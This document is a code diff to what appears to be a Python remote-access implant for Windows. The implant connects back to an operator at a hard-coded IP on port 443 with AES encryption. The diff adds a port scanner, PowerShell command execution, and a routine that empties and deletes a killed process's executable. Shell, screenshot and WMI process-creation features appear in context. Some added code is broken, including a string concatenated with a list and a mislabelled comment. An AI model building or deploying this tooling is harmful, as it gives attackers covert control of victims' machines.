@@ -1,9 +1,9 @@
-import os, sys, subprocess, socket, hashlib, base64, win32api, win32file, wmi
+import os, sys, subprocess, socket, hashlib, base64, win32api, win32file, win32net, wmi
 from Crypto import Random
 from Crypto.Cipher import AES
 
 # Variables for connection and results
-lhost = "127.0.0.1"
+lhost = "192.168.153.128"
 lport = 443
 # This is the key for the AES encryption, can be modified
 CIPHER = "32_rFE2Z@M4KSJYy6w2KgzH9fCYfD=&bPj?e"
@@ -98,6 +98,20 @@ def screenshot(command):
 
 # Upload file to target
 
+# Portscanner function
+def portscan(command):
+  global result
+  ports = [22, 23, 80, 139, 443, 445, 3389]
+  for port in ports:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    r = s.connect_ex((command,port))
+    if r == 0:
+      result += "Port {}:Open\n".format(port)
+    else:
+      result += "Port {}:Closed\n".format(port)
+    s.close()
+
 # Shell functionality
 def shell(command):
   prochandle = subprocess.Popen(command,  shell=False,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -160,6 +174,18 @@ def runCommand(command):
     for i in list:
       result += '%s\n' % (i)
 
+  # Get present working directory
+  elif command.lower().startswith('portscan'):
+    params = command.split()
+    portscan(str(params[1]))
+
+  # Execute command via powershell
+  elif command.lower().startswith('powershell'):
+    params = command.split()
+    pow = 'WindowsPowerShell\v1.0\powershell.exe' + ' ' + params[1:]
+    prochandle = subprocess.Popen(pow,  shell=False,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    result = prochandle.stdout.read() + prochandle.stderr.read()
+
   # Get process list
   elif command.lower().startswith('ps'):
     result = 'ProcessID	ParentID		Name\n'
@@ -172,8 +198,8 @@ def runCommand(command):
     for prc in wmi.Win32_Process(ProcessId=p):
       path = prc.ExecutablePath
     h = win32api.OpenProcess(1, False, p)
-    comd = "cmd.exe /Q /c DEL %s" % (path)
-    wmi.Win32_Process.Create(comd)
+    c = "cmd.exe /Q /c TYPE nul > %s & DEL %s" % (path, path)
+    wmi.Win32_Process.Create(c)
     win32api.TerminateProcess(h, 0)
 
   # Get present working directory
@@ -219,7 +245,7 @@ def runCommand(command):
   elif command.lower().startswith('wmi'):
     params = command.split()
     try:
-      wmi.Win32_Process.Create(str(params[1]))
+      wmi.Win32_Process.Create(params[1])
       result = 'Success\n'
     except:
       result = 'Failed\n'
